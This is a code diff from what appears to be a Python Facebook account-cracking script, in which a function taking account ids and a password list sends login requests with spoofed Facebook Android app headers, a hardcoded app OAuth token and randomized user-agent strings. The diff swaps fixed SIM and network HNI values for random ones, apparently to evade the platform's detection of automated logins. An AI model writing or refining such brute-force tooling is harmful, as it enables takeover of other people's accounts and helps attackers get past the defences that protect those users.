@@ -16,11 +16,11 @@ def api1(ids,names,passlist,total_ids):
 			ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(410,450))+'.0.0.'+str(random.randrange(1,9))+"."+str(random.randint(50,110)) +";FBBV/"+str(random.randint(410000000,499999999))+";[FBAN/FB4A;FBAV/369.0.0.18.103;FBBV/373752061;FBDM/{density=2.75,width=1080,height=2179};FBLC/"+en+";FBRV/375749075;FBCR/BITE;FBMF/Xiaomi;FBBD/POCO;FBPN/com.facebook.katana;FBDV/M2102J20SG;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]" 
 			head = {
                                         'content-type':'application/x-www-form-urlencoded',
-                                        'x-fb-sim-hni':'31016',
+                                        'x-fb-sim-hni':str(random.randint(2e4,4e4)),
                                         'x-fb-connection-type':'WIFI',
                                         'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                                         'user-agent':ua,
-                                        'x-fb-net-hni':'31016',
+                                        'x-fb-net-hni':str(random.randint(2e4,4e4)),
                                         'x-fb-connection-bandwidth':str(random.randint(2e7,3e7)),
                                         'x-fb-connection-quality':'EXCELLENT',
                                         'x-fb-friendly-name':'authenticate',
